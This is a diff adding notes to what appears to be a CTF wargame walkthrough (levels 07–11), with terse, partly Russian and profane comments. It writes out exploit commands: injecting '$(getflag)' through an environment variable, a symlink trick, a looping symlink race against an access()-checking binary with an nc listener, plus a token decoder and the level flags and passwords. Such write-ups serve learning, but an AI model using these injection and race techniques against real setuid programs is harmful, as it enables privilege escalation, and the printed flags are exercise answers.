@@ -107,3 +107,74 @@ create file that matches regexp:
 launch binary with file
 warning will give token
 flag: wiok45aaoguiboiki2tuin6ub
+
+
+==================================================
+
+
+LEVEL07:
+ltrace ./level07
+export LOGNAME='$(getflag)'
+flag: fiumuikeil55xe9cu4dood66h
+
+==================================================
+
+
+LEVEL08:
+
+ln -s ~/token /tmp/kek && ./level08 /tmp/kek
+passwd for flag08: quif5eloekouj29ke0vouxean
+flag: 25749xKZ8L7DkSCwJkT9dyv6f
+
+==================================================
+
+
+LEVEL09:
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <strings.h>
+#include <string.h>
+int main(int ac, char **av)
+{
+        int fd = open(av[1], O_RDONLY);
+        char pepe[30];
+        bzero(pepe, 30);
+        read(fd, pepe, 30);
+        int i = -1;
+        while (++i < strlen(pepe))
+        {
+                printf("%c", pepe[i] - i);
+        }
+        return (0);
+
+}
+
+token: f3iji1ju5yuevaus41q1afiuq
+flag: s5cAJpM8ev6XHw998pRWG728z
+
+
+
+==================================================
+
+
+LEVEL10:
+эта пепега делает acess у которого в мане про уязвимость
+while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+while true; do ./level10 /tmp/exploit 127.0.0.1; done
+ nc -lk 6969
+pass: woupa2yuojeeaaed06riuj63c
+token:  feulo4b72j7edeahuete3no7c
+
+
+
+==================================================
+
+
+LEVEL11:
+пепега крутится на локалхост порт 5151 (в шкрипте эта параша так и написана)
+в цикле при обращении просит пароль
+nc localhost 5151 - слушать порт, хуяк, она просит пароль
+
+flag: fa6v5ateaw21peobuub8ipe6s
